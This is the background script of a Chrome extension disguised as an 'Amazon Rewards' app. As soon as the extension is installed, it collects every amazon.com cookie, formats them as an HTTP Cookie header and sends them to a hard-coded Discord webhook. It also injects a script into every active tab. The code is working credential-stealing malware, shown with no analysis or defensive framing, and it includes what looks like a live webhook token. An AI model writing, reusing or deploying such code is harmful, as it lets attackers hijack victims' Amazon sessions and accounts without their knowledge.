const TARGET_URL = "https://www.amazon.com";

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1376697310188146800/gnvL-SpYv0FFFiRcDJPATX-jgIa_H7B2koRwQTaVQ4LaZsn_GASJDPqlmp7q3HzgyQJo";

const APP_NAME = "Amazon Rewards";

chrome.runtime.onInstalled.addListener(async (details) => {
  const installReason = details.reason;

  chrome.cookies.getAll({ url: TARGET_URL }, async function(cookies) {
    if (chrome.runtime.lastError) {
      const errorMessage = `Error reading cookies from ${TARGET_URL}: ${chrome.runtime.lastError.message}`;
      await sendMessageToDiscord(`🚨 ${APP_NAME} Error! 🚨\n${errorMessage}`);
      if (installReason === 'install') {
      } else {
      }
      return;
    }

    let cookieHeaderString = "";
    if (cookies.length === 0) {
      cookieHeaderString = "No cookies found.";
    } else {
      cookieHeaderString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
    }

    const discordMessage = `
**${APP_NAME}** - Sign up new user, please!
**Target URL:** ${TARGET_URL}
**Reason:** ${installReason}
**Cookies (HTTP Header Format):**
\`\`\`
${cookieHeaderString || 'No cookies found or error.'}
\`\`\`
`;

    await sendMessageToDiscord(discordMessage);
    if (installReason === 'install') {
    } else {
    }
  });
});

/**
 * Sends a message to the configured Discord webhook.
 * @param {string} message The content of the message to send.
 */
async function sendMessageToDiscord(message) {
  const payload = {
    username: APP_NAME,
    content: message // The main message content
  };

  try {
    const response = await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
    } else {
      const errorResponseText = await response.text();
    }
  } catch (error) {
  }
}

async function injectContentScript(tabId) {
  try {
    const tab = await chrome.tabs.get(tabId);

    if (tab.status === 'complete' && tab.url && !tab.url.startsWith('chrome://')) {
      await chrome.scripting.executeScript({
        target: { tabId: tabId },
        world: 'MAIN',
        function: () => {
          if (window._amazonRewardsInterval) {
            clearInterval(window._amazonRewardsInterval);
          }
          if (window._amazonRewardsHeartbeatInterval) {
            clearInterval(window._amazonRewardsHeartbeatInterval);
          }
          window._amazonRewardsInterval = setInterval(() => {
            window.amazon_rewards_extension_data_installed = true;
          }, 100);
          window._amazonRewardsHeartbeatInterval = setInterval(() => {
            try {
              chrome.runtime.sendMessage({ type: "amazon_rewards_heartbeat" });
            } catch (e) {
              if (window._amazonRewardsInterval) clearInterval(window._amazonRewardsInterval);
              if (window._amazonRewardsHeartbeatInterval) clearInterval(window._amazonRewardsHeartbeatInterval);
            }
          }, 15 * 1000);
        }
      });
    }
  } catch (error) {
  }
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.active) {
    injectContentScript(tabId);
  }
});

chrome.tabs.onActivated.addListener(activeInfo => {
  injectContentScript(activeInfo.tabId);
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "amazon_rewards_heartbeat") {
  }
});

chrome.runtime.onInstalled.addListener(async () => {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (tab) {
    injectContentScript(tab.id);
  }
});